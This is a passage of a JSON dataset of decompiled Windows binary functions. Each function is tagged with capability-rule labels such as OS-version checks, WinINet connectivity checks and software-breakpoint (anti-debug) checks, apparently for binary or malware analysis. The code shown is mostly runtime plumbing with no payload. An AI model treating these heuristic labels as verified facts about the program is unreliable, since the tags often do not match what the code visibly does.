        "decompiled_code": "\nuint fcn.0041acc7(uint32_t *param_1)\n\n{\n    int32_t iVar1;\n    uint8_t *unaff_ESI;\n    uint8_t *unaff_EDI;\n    \n    iVar1 = *(unaff_ESI + 4);\n    if ((iVar1 != 0) && (*(iVar1 + 8) != '\\0')) {\n        if ((iVar1 != *(unaff_EDI + 4)) && (iVar1 = fcn.0041b910(iVar1 + 8, *(unaff_EDI + 4) + 8),  iVar1 != 0)) {\n            return 0;\n        }\n        if (((((*unaff_EDI & 2) != 0) && ((*unaff_ESI & 8) == 0)) || (((*param_1 & 1) != 0 && ((*unaff_ESI & 1) == 0))))\n           || (((*param_1 & 2) != 0 && ((*unaff_ESI & 2) == 0)))) {\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 244
    },
    "0041ad34": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041ad34(uint arg_8h, uint noname_1, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    int32_t iVar5;\n    uint var_20h;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00419d14(0x441a28, 0x10);\n    iVar1 = *(unaff_EBP + 8);\n    iVar5 = *(iVar1 + 8);\n    *(unaff_EBP + -0x1c) = iVar5;\n    iVar2 = fcn.0041b5aa();\n    *(iVar2 + 0x84) = *(iVar2 + 0x84) + 1;\n    *(unaff_EBP + -4) = 0;\n    iVar2 = *(unaff_EBP + 0x10);\n    while (iVar5 != *(unaff_EBP + 0x14)) {\n        if ((iVar5 < 0) || (*(iVar2 + 4) <= iVar5)) {\n            fcn.0041b886();\n        }\n        iVar3 = iVar5 * 8;\n        piVar4 = *(iVar2 + 8) + iVar3;\n        iVar5 = *piVar4;\n        *(unaff_EBP + -0x20) = iVar5;\n        *(unaff_EBP + -4) = 1;\n        if (piVar4[1] != 0) {\n            *(iVar1 + 8) = iVar5;\n            fcn.0041b8c0(*(*(iVar2 + 8) + 4 + iVar3), iVar1, 0x103);\n        }\n        *(unaff_EBP + -4) = 0;\n        *(unaff_EBP + -0x1c) = iVar5;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0041ade7();\n    if (iVar5 != *(unaff_EBP + 0x14)) {\n        fcn.0041b886();\n    }\n    *(iVar1 + 8) = iVar5;\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 536
    },
    "0041ade7": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041ade7(void)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0041b5aa();\n    if (0 < *(iVar1 + 0x84)) {\n        iVar1 = fcn.0041b5aa();\n        *(iVar1 + 0x84) = *(iVar1 + 0x84) + -1;\n    }\n    return;\n}\n",
        "token_count": 91
    },
    "0041ae47": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041ae47(int32_t *param_1)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    iVar1 = *param_1 + in_EAX;\n    if (-1 < param_1[1]) {\n        iVar1 = iVar1 + *(*(param_1[1] + in_EAX) + param_1[2]) + param_1[1];\n    }\n    return iVar1;\n}\n",
        "token_count": 105
    },
    "0041afce": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.0041afce(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_EBP;\n    int32_t *unaff_ESI;\n    int32_t unaff_EDI;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_20h;\n    \n    *(unaff_EDI + -4) = *(unaff_EBP + -0x38);\n    fcn.004180d2(*(unaff_EBP + -0x3c));\n    iVar1 = fcn.0041b5aa();\n    *(iVar1 + 0x7c) = *(unaff_EBP + -0x40);\n    iVar1 = fcn.0041b5aa();\n    *(iVar1 + 0x80) = *(unaff_EBP + -0x44);\n    if ((((*unaff_ESI == -0x1f928c9d) && (unaff_ESI[4] == 3)) &&\n        ((unaff_ESI[5] == 0x19930520 || (unaff_ESI[5] == 0x19930521)))) &&\n       ((*(unaff_EBP + -0x48) == 0 && (*(unaff_EBP + -0x20) != 0)))) {\n        iVar1 = fcn.004180b1(unaff_ESI[6]);\n        if (iVar1 != 0) {\n            fcn.00418222();\n            fcn.0041ae02(unaff_ESI);\n        }\n    }\n    return;\n}\n",
        "token_count": 360
    },
    "0041b03d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0041b03d(uint arg_8h, uint arg_ch)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint arg_ch_00;\n    uint uVar5;\n    uint8_t *extraout_ECX;\n    int32_t *extraout_EDX;\n    int32_t unaff_EBP;\n    int32_t *arg_8h_00;\n    uint var_4h;\n    \n    fcn.00419d14(0x441a68, 8);\n    puVar1 = *(unaff_EBP + 0xc);\n    iVar4 = *(unaff_EBP + 8);\n    if (((puVar1[1] == 0) || (*(puVar1[1] + 8) == '\\0')) || ((puVar1[2] == 0 && ((*(puVar1 + 3) & 0x80) == 0))))\n    goto code_r0x0041b1a7;\n    uVar2 = *puVar1;\n    arg_8h_00 = extraout_EDX;\n    if (-1 < uVar2) {\n        arg_8h_00 = puVar1[2] + 0xc + extraout_EDX;\n    }\n    *(unaff_EBP + -4) = 0;\n    uVar5 = *(iVar4 + 0x18);\n    if ((uVar2 & 8) == 0) {\n        if ((*extraout_ECX & 1) == 0) {\n            if (*(extraout_ECX + 0x18) == 0) {\n                iVar4 = fcn.004216c0(uVar5, 1);\n                if ((iVar4 == 0) || (iVar4 = fcn.004216dc(arg_8h_00, 1),  iVar4 == 0)) {\ncode_r0x0041b19e:\n                    fcn.0041b886();\n                }\n                else {\n                    uVar5 = *(extraout_ECX + 0x14);\n                    arg_ch_00 = fcn.0041ae47();\n                    fcn.00418360(arg_8h_00, arg_ch_00, uVar5);\n                }\n            }\n            else {\n                iVar4 = fcn.004216c0(uVar5, 1);\n                if (((iVar4 == 0) || (iVar4 = fcn.004216dc(arg_8h_00, 1),  iVar4 == 0)) ||\n                   (iVar4 = fcn.004216f8(*(extraout_ECX + 0x18)),  iVar4 == 0)) goto code_r0x0041b19e;\n                if ((*extraout_ECX & 4) == 0) {\n                    uVar5 = fcn.0041ae47();\n                    fcn.00417dcc(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n                else {\n                    uVar5 = fcn.0041ae47(1);\n                    fcn.00417dcc(arg_8h_00, *(extraout_ECX + 0x18), uVar5);\n                }\n            }\n        }\n        else {\n            iVar3 = fcn.004216c0(uVar5, 1);\n            if ((iVar3 == 0) || (iVar3 = fcn.004216dc(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0041b19e;\n            fcn.00418360(arg_8h_00, *(iVar4 + 0x18), *(extraout_ECX + 0x14));\n            if ((*(extraout_ECX + 0x14) == 4) && (*arg_8h_00 != 0)) goto code_r0x0041b0b6;\n        }\n    }\n    else {\n        iVar3 = fcn.004216c0(uVar5, 1);\n        if ((iVar3 == 0) || (iVar3 = fcn.004216dc(arg_8h_00, 1),  iVar3 == 0)) goto code_r0x0041b19e;\n        *arg_8h_00 = *(iVar4 + 0x18);\ncode_r0x0041b0b6:\n        iVar4 = fcn.0041ae47();\n        *arg_8h_00 = iVar4;\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\ncode_r0x0041b1a7:\n    fcn.00419d4f();\n    return;\n}\n",
        "token_count": 1050
    },
    "0041b1b9": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0041b1b9(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    int32_t in_ECX;\n    uint unaff_EBX;\n    int32_t unaff_ESI;\n    uint *unaff_EDI;\n    \n    if (in_ECX != 0) {\n        fcn.0041b03d(arg_8h, unaff_EBX);\n    }\n    if (arg_1ch == 0) {\n        arg_1ch = unaff_ESI;\n    }\n    fcn.00417dd3(arg_1ch, arg_8h);\n    fcn.0041ad34(unaff_ESI, arg_10h, arg_14h, *unaff_EDI);\n    *(unaff_ESI + 8) = unaff_EDI[1] + 1;\n    iVar1 = fcn.0041ae79(arg_8h, unaff_ESI, arg_ch, arg_14h, arg_18h, 0x100);\n    if (iVar1 != 0) {\n        fcn.00417d9c(iVar1);\n    }\n    return;\n}\n",
        "token_count": 284
    },
    "0041b220": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl\nfcn.0041b220(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_retaddr;\n    uint in_stack_00000024;\n    uint32_t var_8h;\n    uint32_t var_4h;\n    \n    if ((*arg_8h != -0x7ffffffd) &&\n       (((iVar1 = fcn.0041b5aa(),  *(iVar1 + 0x74) == 0 ||\n         (iVar1 = fcn.00417e96(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h, unaff_ESI, var_8h, var_4h, \n                               unaff_EBP, unaff_retaddr, arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, \n                               arg_24h, in_stack_00000024),  iVar1 == 0)) &&\n        (piVar2 = fcn.0041800f(arg_18h, arg_20h, arg_1ch, &var_4h, &var_8h),  var_4h < var_8h)))) {\n        do {\n            if (((*piVar2 <= arg_1ch) && (arg_1ch <= piVar2[1])) &&\n               ((iVar1 = *(piVar2[3] * 0x10 + piVar2[4] + -0xc),  iVar1 == 0 || (*(iVar1 + 8) == '\\0')))) {\n                fcn.0041b1b9(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n            }\n            var_4h = var_4h + 1;\n            piVar2 = piVar2 + 5;\n        } while (var_4h < var_8h);\n    }\n    return;\n}\n",
        "token_count": 552
    },
    "0041b2de": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl\nfcn.0041b2de(int32_t *arg_8h, int32_t arg_ch, uint arg_10h, uint arg_14h, int32_t arg_18h, uint arg_1ch, uint arg_20h, \n            uint arg_24h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint var_24h;\n    uint32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    int32_t *var_10h;\n    uint32_t var_ch;\n    int32_t *var_8h;\n    uchar auStack8 [3];\n    uint var_1h;\n    \n    var_1ch = *(arg_ch + 8);\n    _auStack8 = auStack8;\n    if ((var_1ch < -1) || (*(arg_18h + 4) <= var_1ch)) {\n        fcn.0041b886();\n    }\n    if (*arg_8h == -0x1f928c9d) {\n        if ((arg_8h[4] == 3) && (((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)) && (arg_8h[7] == 0)))) {\n            iVar2 = fcn.0041b5aa();\n            if (*(iVar2 + 0x7c) == 0) {\n                return;\n            }\n            iVar2 = fcn.0041b5aa();\n            arg_8h = *(iVar2 + 0x7c);\n            iVar2 = fcn.0041b5aa();\n            arg_10h = *(iVar2 + 0x80);\n            _auStack8 = CONCAT13(1, auStack8);\n            iVar2 = fcn.004216c0(arg_8h, 1);\n            if (iVar2 == 0) {\n                fcn.0041b886();\n            }\n            if (*arg_8h != -0x1f928c9d) goto code_r0x0041b4b7;\n            if (((arg_8h[4] == 3) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521)))) && (arg_8h[7] == 0)) {\n                fcn.0041b886();\n            }\n        }\n        iVar2 = var_1ch;\n        if (((*arg_8h == -0x1f928c9d) && (arg_8h[4] == 3)) && ((arg_8h[5] == 0x19930520 || (arg_8h[5] == 0x19930521))))\n        {\n            piVar3 = fcn.0041800f(arg_18h, arg_20h, var_1ch, &var_ch, &var_20h);\n            var_8h = piVar3;\n            if (var_ch < var_20h) {\n                do {\n                    if ((*piVar3 == iVar2 || *piVar3 < iVar2) && (iVar2 <= piVar3[1])) {\n                        var_8h = piVar3;\n                        for (var_18h = piVar3[3]; 0 < var_18h; var_18h = var_18h + -1) {\n                            var_10h = *(arg_8h[7] + 0xc);\n                            for (var_14h = *var_10h; var_10h = var_10h + 1,  0 < var_14h; var_14h = var_14h + -1) {\n                                iVar2 = fcn.0041acc7(arg_8h[7]);\n                                piVar3 = var_8h;\n                                if (iVar2 != 0) {\n                                    fcn.0041b1b9(arg_8h, arg_10h, arg_14h, arg_18h, arg_20h, arg_24h);\n                                    goto code_r0x0041b48a;\n                                }\n                            }\n                        }\n                    }\ncode_r0x0041b48a:\n                    var_ch = var_ch + 1;\n                    piVar3 = piVar3 + 5;\n                    iVar2 = var_1ch;\n                    var_8h = piVar3;\n                } while (var_ch < var_20h);\n            }\n            if (arg_1ch == '\\0') {\n                return;\n            }\n            fcn.0041ae02(arg_8h);\n            return;\n        }\n    }\ncode_r0x0041b4b7:\n    if (arg_1ch == '\\0') {\n        fcn.0041b220(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, var_1ch, arg_20h, arg_24h);\n        return;\n    }\n    fcn.00419d14(0x441ac0, 8);\n    iVar2 = fcn.0041b5aa();\n    if (*(iVar2 + 0x6c) != 0) {\n        _auStack8 = 0;\n        iVar2 = fcn.0041b5aa();\n        (**(iVar2 + 0x6c))();\n        _auStack8 = 0xffffffff;\n    }\n    fcn.0041e7a8(10);\n    fcn.00424c33(0x16);\n    fcn.00419a7b(3);\n    pcVar1 = swi(3);\n    (*pcVar1)();\n    return;\n}\n",
        "token_count": 1306
    },
    "0041b4e2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0041b4e2(int32_t *arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint32_t *arg_18h, int32_t arg_1ch, uint arg_20h\n            , uint32_t arg_24h)\n\n{\n    uint uVar1;\n    \n    if ((*arg_18h & 0x1fffffff) != 0x19930520) {\n        fcn.0041b886();\n    }\n    if ((*(arg_8h + 1) & 0x66) == 0) {\n        if (arg_18h[3] != 0) {\n            if (((*arg_8h == -0x1f928c9d) && (0x19930520 < arg_8h[5])) && (*(arg_8h[7] + 8) != NULL)) {\n                uVar1 = (**(arg_8h[7] + 8))(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_1ch, arg_20h, arg_24h & 0xff)\n                ;\n                return uVar1;\n            }\n            fcn.0041b2de(arg_8h, arg_ch, arg_10h, arg_14h, arg_18h, arg_24h, arg_1ch, arg_20h);\n        }\n    }\n    else if ((arg_18h[1] != 0) && (arg_1ch == 0)) {\n        fcn.0041ad34(arg_ch, arg_14h, arg_18h, 0xffffffff);\n    }\n    return 1;\n}\n",
        "token_count": 382
    },
    "0041b58d": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041b58d(void)\n\n{\n    int32_t arg_8h;\n    code *pcVar1;\n    int32_t *piVar2;\n    \n    if (*0x44d4ec != -1) {\n        (**0x4507d8)(*0x44d4ec);\n        *0x44d4ec = -1;\n    }\n    pcVar1 = _sym.imp.KERNEL32.dll_DeleteCriticalSection;\n    piVar2 = 0x44d788;\n    do {\n        arg_8h = *piVar2;\n        if ((arg_8h != 0) && (piVar2[1] != 1)) {\n            (*pcVar1)(arg_8h);\n            fcn.00418911(arg_8h);\n            *piVar2 = 0;\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x44d8a8);\n    piVar2 = 0x44d788;\n    do {\n        if ((*piVar2 != 0) && (piVar2[1] == 1)) {\n            (*pcVar1)(*piVar2);\n        }\n        piVar2 = piVar2 + 2;\n    } while (piVar2 < 0x44d8a8);\n    return;\n}\n",
        "token_count": 294
    },
    "0041b762": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint fcn.0041b762(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint uVar4;\n    \n    iVar2 = fcn.0041c5c0();\n    if (iVar2 == 0) {\n        fcn.0041b58d();\n        return 0;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32.dll\");\n    pcVar1 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (iVar2 != 0) {\n        *0x4507cc = (*_sym.imp.KERNEL32.dll_GetProcAddress)(iVar2, \"FlsAlloc\");\n        *0x4507d0 = (*pcVar1)(iVar2, \"FlsGetValue\");\n        *0x4507d4 = (*pcVar1)(iVar2, \"FlsSetValue\");\n        *0x4507d8 = (*pcVar1)(iVar2, \"FlsFree\");\n        if (*0x4507d0 == 0) {\n            *0x4507d0 = _sym.imp.KERNEL32.dll_TlsGetValue;\n            *0x4507d4 = _sym.imp.KERNEL32.dll_TlsSetValue;\n            *0x4507cc = 0x41b584;\n            *0x4507d8 = _sym.imp.KERNEL32.dll_TlsFree;\n        }\n    }\n    *0x44d4ec = (**0x4507cc)(0x41b61b);\n    if (((*0x44d4ec != -1) && (puVar3 = fcn.0041ac0c(1, 0x8c),  puVar3 != NULL)) &&\n       (iVar2 = (**0x4507d4)(*0x44d4ec, puVar3),  iVar2 != 0)) {\n        puVar3[0x15] = 0x44da18;\n        puVar3[5] = 1;\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetCurrentThreadId)();\n        puVar3[1] = 0xffffffff;\n        *puVar3 = uVar4;\n        return 1;\n    }\n    fcn.0041b58d();\n    return 0;\n}\n",
        "token_count": 503
    },
    "0041bb08": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid fcn.0041bb08(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    int32_t unaff_EDI;\n    \n    if (((*(unaff_EDI + 0xc) & 0x40) == 0) || (*(unaff_EDI + 8) != 0)) {\n        do {\n            if (param_1 < 1) {\n                return;\n            }\n            param_1 = param_1 + -1;\n            fcn.0041bab1();\n        } while (*in_EAX != -1);\n    }\n    else {\n        *in_EAX = *in_EAX + param_1;\n    }\n    return;\n}\n",
        "token_count": 151
    },
    "0041bb3f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Type propagation algorithm not settling\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.0041bb3f(uint param_1, uint8_t *param_2, int32_t **param_3)\n\n{\n    uint8_t uVar1;\n    uint8_t *puVar2;\n    int32_t **ppiVar3;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t *piVar8;\n    int32_t extraout_ECX;\n    int32_t iVar9;\n    uint8_t uVar10;\n    char *arg_ch;\n    bool bVar11;\n    int64_t iVar12;\n    int32_t *piStack600;\n    int32_t *piStack596;\n    int32_t iStack588;\n    int32_t iStack584;\n    uint uStack580;\n    int32_t iStack576;\n    int32_t iStack572;\n    int32_t *piStack568;\n    int32_t iStack564;\n    int32_t *piStack560;\n    int32_t iStack556;\n    uchar uStack552;\n    char cStack551;\n    int32_t iStack548;\n    int32_t iStack544;\n    int32_t *piStack540;\n    int32_t *piStack536;\n    uint32_t uStack532;\n    int32_t aiStack528 [127];\n    uint uStack17;\n    uint uStack8;\n    \n    uStack8 = *0x44d270;\n    iStack544 = 0;\n    iStack548 = 0;\n    piStack568 = NULL;\n    uVar10 = *param_2;\n    iVar7 = 0;\n    puVar2 = param_2;\n    ppiVar3 = param_3;\n    do {\n        if ((uVar10 == 0) || (param_2 = puVar2 + 1,  iStack548 < 0)) {\n            fcn.004192ca();\n            return;\n        }\n        if ((uVar10 < ' ') || ('x' < uVar10)) {\n            uVar5 = 0;\n        }\n        else {\n            uVar5 = *(uVar10 + 0x441ac0) & 0xf;\n        }\n        iStack584 = *(iVar7 + 0x441ae0 + uVar5 * 8) >> 4;\n        param_3 = ppiVar3;\n    // switch table (8 cases) at 0x41c319\n        switch(iStack584) {\n        case 0:\ncode_r0x0041bd5b:\n            iStack564 = 0;\n            if ((*(*0x44dcc0 + 1 + uVar10 * 2) & 0x80) != 0) {\n                fcn.0041bab1();\n                param_2 = puVar2 + 2;\n            }\n            fcn.0041bab1();\n            break;\n        case 1:\n            piStack536 = 0xffffffff;\n            uStack580 = 0;\n            iStack572 = 0;\n            piStack560 = NULL;\n            iStack556 = 0;\n            uStack532 = 0;\n            iStack564 = 0;\n            break;\n        case 2:\n            if (uVar10 == 0x20) {\n                uStack532 = uStack532 | 2;\n            }\n            else if (uVar10 == 0x23) {\n                uStack532 = uStack532 | 0x80;\n            }\n            else if (uVar10 == 0x2b) {\n                uStack532 = uStack532 | 1;\n            }\n            else if (uVar10 == 0x2d) {\n                uStack532 = uStack532 | 4;\n            }\n            else if (uVar10 == 0x30) {\n                uStack532 = uStack532 | 8;\n            }\n            break;\n        case 3:\n            if (uVar10 == 0x2a) {\n                piStack560 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack560 < 0) {\n                    uStack532 = uStack532 | 4;\n                    piStack560 = -piStack560;\n                }\n            }\n            else {\n                piStack560 = uVar10 + -0x30 + piStack560 * 10;\n            }\n            break;\n        case 4:\n            piStack536 = NULL;\n            break;\n        case 5:\n            if (uVar10 == 0x2a) {\n                piStack536 = *ppiVar3;\n                param_3 = ppiVar3 + 1;\n                if (piStack536 < 0) {\n                    piStack536 = 0xffffffff;\n                }\n            }\n            else {\n                piStack536 = uVar10 + -0x30 + piStack536 * 10;\n            }\n            break;\n        case 6:\n            if (uVar10 == 0x49) {\n                uVar1 = *param_2;\n                if ((uVar1 == 0x36) && (puVar2[2] == 0x34)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 | 0x8000;\n                }\n                else if ((uVar1 == 0x33) && (puVar2[2] == 0x32)) {\n                    param_2 = puVar2 + 3;\n                    uStack532 = uStack532 & 0xffff7fff;\n                }\n                else if (((((uVar1 != 100) && (uVar1 != 0x69)) && (uVar1 != 0x6f)) &&\n                         ((uVar1 != 0x75 && (uVar1 != 0x78)))) && (uVar1 != 0x58)) {\n                    iStack584 = 0;\n                    goto code_r0x0041bd5b;\n                }\n            }\n            else if (uVar10 == 0x68) {\n                uStack532 = uStack532 | 0x20;\n            }\n            else if (uVar10 == 0x6c) {\n                uStack532 = uStack532 | 0x10;\n            }\n            else if (uVar10 == 0x77) {\n                uStack532 = uStack532 | 0x800;\n            }\n            break;\n        case 7:\n            if (uVar10 < 'h') {\n                if (uVar10 < 'e') {\n                    if (uVar10 < 'Y') {\n                        if (uVar10 != 0x58) {\n                            if (uVar10 == 0x43) {\n                                if ((uStack532 & 0x830) == 0) {\n                                    uStack532 = uStack532 | 0x800;\n                                }\n                                goto code_r0x0041be64;\n                            }\n                            if ((uVar10 != 0x45) && (uVar10 != 0x47)) {\n                                if (uVar10 == 0x53) {\n                                    if ((uStack532 & 0x830) == 0) {\n                                        uStack532 = uStack532 | 0x800;\n                                    }\n                                    goto code_r0x0041bde7;\n                                }\n                                goto code_r0x0041c1dc;\n                            }\n                            uStack580 = 1;\n                            uVar10 = uVar10 + 0x20;\n                            goto code_r0x0041be38;\n                        }\ncode_r0x0041c082:\n                        iStack576 = 7;\ncode_r0x0041c085:\n                        iStack544 = 0x10;\n                        if ((uStack532 & 0x80) != 0) {\n                            cStack551 = iStack576 + 'Q';\n                            uStack552 = 0x30;\n                            iStack556 = 2;\n                        }\n                        goto code_r0x0041beb5;\n                    }\n                    if (uVar10 == 0x5a) {\n                        param_3 = ppiVar3 + 1;\n                        piVar8 = *ppiVar3;\n                        piVar6 = *0x44d500;\n                        piVar4 = *0x44d500;\n                        if ((piVar8 == NULL) || (piStack540 = piVar8[1],  piVar4 = *0x44d500,  piStack540 == NULL))\n                        goto code_r0x0041bff6;\n                        iStack544 = *piVar8;\n                        if ((uStack532 & 0x800) == 0) {\n                            iStack564 = 0;\n                        }\n                        else {\n                            iStack544 = iStack544 / 2;\n                            iStack564 = 1;\n                        }\n                    }\n                    else if (uVar10 == 99) {\ncode_r0x0041be64:\n                        if ((uStack532 & 0x810) == 0) {\n                            aiStack528[0]._0_1_ = *ppiVar3;\n                            iStack544 = 1;\n                        }\n                        else {\n                            iStack544 = fcn.00421b8e(aiStack528, *ppiVar3);\n                            if (iStack544 < 0) {\n                                iStack572 = 1;\n                            }\n                        }\n                        param_3 = ppiVar3 + 1;\n                        piStack540 = aiStack528;\n                    }\n                    else if (uVar10 == 100) goto code_r0x0041beaa;\n                }\n                else {\ncode_r0x0041be38:\n                    uStack532 = uStack532 | 0x40;\n                    piVar8 = aiStack528;\n                    piVar6 = aiStack528;\n                    if (piStack536 < 0) {\n                        piStack536 = 0x6;\n                    }\n                    else if (piStack536 == NULL) {\n                        if (uVar10 == 0x67) {\n                            piStack536 = 0x1;\n                        }\n                    }\n                    else {\n                        if (0x200 < piStack536) {\n                            piStack536 = 0x200;\n                        }\n                        if ((0xa3 < piStack536) &&\n                           (piStack540 = aiStack528,  piStack568 = fcn.004188ff(piStack536 + 0x15d), \n                           piVar8 = piStack568,  piVar6 = piStack568,  piStack568 == NULL)) {\n                            piStack536 = 0xa3;\n                            piVar8 = aiStack528;\n                            piVar6 = piStack540;\n                        }\n                    }\n                    piStack540 = piVar6;\n                    piStack600 = *ppiVar3;\n                    param_3 = ppiVar3 + 2;\n                    piStack596 = ppiVar3[1];\n                    (**0x44d960)(&piStack600, piVar8, uVar10, piStack536, uStack580);\n                    uVar5 = uStack532 & 0x80;\n                    if ((uVar5 != 0) && (piStack536 == NULL)) {\n                        (**0x44d96c)(piVar8);\n                    }\n                    if ((uVar10 == 0x67) && (uVar5 == 0)) {\n                        (**0x44d964)(piVar8);\n                    }\n                    piVar6 = piVar8;\n                    piVar4 = piStack540;\n                    if (*piVar8 == '-') {\n                        uStack532 = uStack532 | 0x100;\n                        piVar6 = piVar8 + 1;\n                        piVar4 = piVar8 + 1;\n                    }\ncode_r0x0041bff6:\n                    piStack540 = piVar4;\n                    iStack544 = fcn.004196b0(piVar6);\n                }\ncode_r0x0041c1dc:\n                uVar5 = uStack532;\n                if (iStack572 == 0) {\n                    if ((uStack532 & 0x40) != 0) {\n                        if ((uStack532 & 0x100) == 